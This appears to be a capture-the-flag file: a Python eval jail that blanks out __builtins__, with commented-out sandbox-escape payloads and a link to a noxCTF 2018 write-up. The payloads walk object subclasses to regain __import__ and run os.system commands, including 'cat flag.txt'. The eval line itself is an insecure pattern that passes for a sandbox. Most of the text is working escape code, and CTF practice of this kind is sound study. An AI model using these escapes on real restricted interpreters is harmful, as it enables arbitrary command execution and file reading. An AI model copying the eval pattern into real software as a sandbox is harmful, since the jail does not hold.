print(eval(input("code> "), {"__builtins__": {}}, {"__builtins__": {}}))

#[].__class__.__base__.__subclasses__()[50]

#'warnings.catch_warnings'
#''.__class__.__mro__[1].__subclasses__()[147]()._module.__builtins__['__import__']('os').system('ls')
#[].__class__.__mro__[1].__subclasses__()[147].__init__.func_globals.values()[13]["eval"]("__import__('os').system('ls')")

#__builtins__.__import__("os").system("ls")

#Solver https://blog.raw.pm/en/noxCTF-2018-write-ups/
#''.__class__.__mro__[1].__subclasses__()[133].__init__.__globals__["sys"].modules["os"].system("cat flag.txt")